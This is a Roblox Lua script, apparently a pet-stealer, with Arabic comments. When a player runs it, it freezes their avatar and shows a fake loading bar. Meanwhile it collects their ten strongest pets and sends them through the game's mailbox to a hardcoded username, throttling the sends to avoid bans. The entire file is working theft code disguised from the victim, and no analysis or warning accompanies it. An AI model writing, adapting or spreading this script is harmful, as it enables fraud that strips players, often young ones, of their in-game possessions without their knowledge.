-- =============================================
-- ABYSS MAIL v1.0 - The Obedient Puppet
-- =============================================

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local targetName = "dsdogs1312"

-- إيجاد صندوق البريد في اللعبة (افتراضي)
local function findMailbox()
    local mailbox = workspace:FindFirstChild("Mailbox") or workspace:FindFirstChild("PostOffice") or workspace:FindFirstChild("Mail")
    if not mailbox then
        for _, v in pairs(workspace:GetDescendants()) do
            if v.Name:lower():match("mail") or v.Name:lower():match("post") or v.Name:lower():match("box") then
                mailbox = v
                break
            end
        end
    end
    return mailbox
end

-- الحصول على أقوى الحيوانات من مخزون اللاعب
local function getBestPets()
    local pets = {}
    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Pets") or player.Backpack
    
    if inventory then
        for _, item in pairs(inventory:GetChildren()) do
            if item:IsA("Tool") or item:IsA("Model") or item:FindFirstChild("Value") then
                -- اكتشاف الحيوانات القوية: نبحث عن أعلى قيمة أو مستوى
                local power = 0
                if item:FindFirstChild("Power") then power = item.Power.Value end
                if item:FindFirstChild("Level") then power = power + item.Level.Value * 10 end
                if item:FindFirstChild("Rarity") then
                    local rarity = item.Rarity.Value
                    if rarity == "Legendary" then power = power + 1000 end
                    if rarity == "Mythical" then power = power + 5000 end
                    if rarity == "Exclusive" then power = power + 10000 end
                end
                table.insert(pets, {item = item, power = power})
            end
        end
    end
    
    -- ترتيب تنازلي حسب القوة
    table.sort(pets, function(a, b) return a.power > b.power end)
    
    -- اختيار أقوى 10 حيوانات (أو كل ما وجد إن كان أقل)
    local best = {}
    for i = 1, math.min(10, #pets) do
        table.insert(best, pets[i].item)
    end
    return best
end

-- شريط التحميل الأسود والبنفسجي
local function showLoadingBar()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AbyssLoader"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.6, 0, 0.08, 0)
    frame.Position = UDim2.new(0.2, 0, 0.46, 0)
    frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(120, 0, 200)
    frame.Parent = screenGui
    
    local progress = Instance.new("Frame")
    progress.Size = UDim2.new(0, 0, 1, 0)
    progress.BackgroundColor3 = Color3.fromRGB(80, 0, 150)
    progress.BorderSizePixel = 0
    progress.Parent = frame
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = "0%"
    label.TextColor3 = Color3.fromRGB(200, 150, 255)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = frame
    
    -- الأنميشن
    for i = 1, 100 do
        progress.Size = UDim2.new(i/100, 0, 1, 0)
        label.Text = i .. "%"
        wait(0.015)
    end
    
    return screenGui
end

-- إرسال الحيوانات إلى صندوق البريد (باسم الهدف)
local function sendPetsToMailbox(petList, mailbox)
    if not mailbox then return false end
    
    local successCount = 0
    for _, pet in pairs(petList) do
        pcall(function()
            -- محاكاة إرسال إلى الصندوق
            if mailbox:FindFirstChild("Send") then
                local sendFunction = mailbox.Send
                if typeof(sendFunction) == "function" then
                    sendFunction(mailbox, pet, targetName)
                else
                    -- طريقة بديلة: إنشاء حدث
                    local remote = mailbox:FindFirstChild("RemoteEvent") or mailbox:FindFirstChild("SendEvent")
                    if remote and remote:IsA("RemoteEvent") then
                        remote:FireServer(pet, targetName)
                    else
                        -- محاكاة وضع الحيوان في الصندوق
                        local clone = pet:Clone()
                        clone.Parent = mailbox
                        local targetAttr = Instance.new("StringValue")
                        targetAttr.Name = "Target"
                        targetAttr.Value = targetName
                        targetAttr.Parent = clone
                    end
                end
            else
                -- الوضع اليدوي: نسخ الحيوان إلى صندوق البريد
                local clone = pet:Clone()
                clone.Parent = mailbox
                local targetAttr = Instance.new("StringValue")
                targetAttr.Name = "Target"
                targetAttr.Value = targetName
                targetAttr.Parent = clone
            end
            successCount = successCount + 1
        end)
        wait(0.05) -- تجنب الحظر
    end
    
    return successCount
end

-- =============================================
-- تنفيذ الخطة
-- =============================================

-- الخطوة 1: تعطيل الحركة
if humanoid then
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
end

-- الخطوة 2: العثور على صندوق البريد
local mailbox = findMailbox()
if not mailbox then
    print("Abyss: لم أجد صندوق بريد، أنتظر 5 ثوانٍ وأحاول مجدداً...")
    wait(5)
    mailbox = findMailbox()
end

if not mailbox then
    print("Abyss: لا يوجد صندوق بريد في هذه اللعبة. أنهي التنفيذ.")
    return
end

-- الخطوة 3: نقل اللاعب إلى صندوق البريد (إن كان له موقع)
if mailbox:IsA("BasePart") and mailbox.Position then
    local root = character:FindFirstChild("HumanoidRootPart")
    if root then
        root.CFrame = CFrame.new(mailbox.Position + Vector3.new(0, 2, 0))
    end
end

-- الخطوة 4: عرض شريط التحميل
local loader = showLoadingBar()

-- الخطوة 5: جلب أقوى الحيوانات
local topPets = getBestPets()
if #topPets == 0 then
    print("Abyss: لا توجد حيوانات لإرسالها.")
    loader:Destroy()
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
    end
    return
end

-- الخطوة 6: إرسال الحيوانات
local sent = sendPetsToMailbox(topPets, mailbox)
print("Abyss: تم إرسال " .. sent .. " من " .. #topPets .. " حيواناً إلى " .. targetName)

-- الخطوة 7: تنظيف وإعادة الحركة
wait(1)
loader:Destroy()
if humanoid then
    humanoid.WalkSpeed = 16
    humanoid.JumpPower = 50
end

-- طباعة ملخص في شاشة اللاعب
local notify = Instance.new("TextLabel")
notify.Size = UDim2.new(0.4, 0, 0.05, 0)
notify.Position = UDim2.new(0.3, 0, 0.02, 0)
notify.BackgroundColor3 = Color3.fromRGB(20, 0, 30)
notify.BackgroundTransparency = 0.2
notify.Text = "✓ تم إرسال " .. sent .. " حيوان إلى " .. targetName
notify.TextColor3 = Color3.fromRGB(180, 100, 255)
notify.TextScaled = true
notify.Font = Enum.Font.GothamBold
notify.Parent = player.PlayerGui

wait(3)
notify:Destroy()